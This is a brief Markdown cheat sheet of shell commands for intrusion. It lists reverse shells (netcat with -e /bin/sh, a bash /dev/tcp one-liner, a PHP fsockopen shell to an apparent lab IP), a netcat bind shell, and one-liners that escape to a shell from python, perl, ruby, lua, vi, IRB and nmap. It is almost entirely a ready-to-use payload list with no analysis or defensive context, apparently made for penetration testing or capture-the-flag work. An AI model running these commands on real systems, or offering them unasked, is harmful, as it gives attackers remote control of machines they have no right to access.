# Shells

## Reverse shell

| tool           | local                 |      | remote                         |
|----------------|-----------------------|------|--------------------------------|
| netcat         | nc -lvp 4444          |  <-  | nc 192.168.1.1 4444 -e /bin/sh |
| netcat <br> bash | nc -lvp 4444          |  <-  | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 |
| netcat <br> php  | nc -lvp 4444          | <-   | php -r '$sock=fsockopen("10.10.14.176",4444);exec("/bin/sh -i <&3 >&3 2>&3");' |

## Bind shell

| tool   | local                 |      | remote                         |
|--------|-----------------------|------|--------------------------------|
| netcat | nc 192.168.1.2 4444   |  ->  | nc -lvp 4444 -e /bin/sh        |

## Spawning a TTY Shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
echo os.system('/bin/bash')
```

```
/bin/sh -i
```

```
perl —e 'exec "/bin/sh";'
```

```
perl: exec "/bin/sh";
```

```
ruby: exec "/bin/sh"
```

```
lua: os.execute('/bin/sh')
```
```
(From within IRB)
exec "/bin/sh"
```

```
(From within vi)
:!bash
```

```
(From within vi)
:set shell=/bin/bash:shell
```

```
(From within nmap)
!sh
```
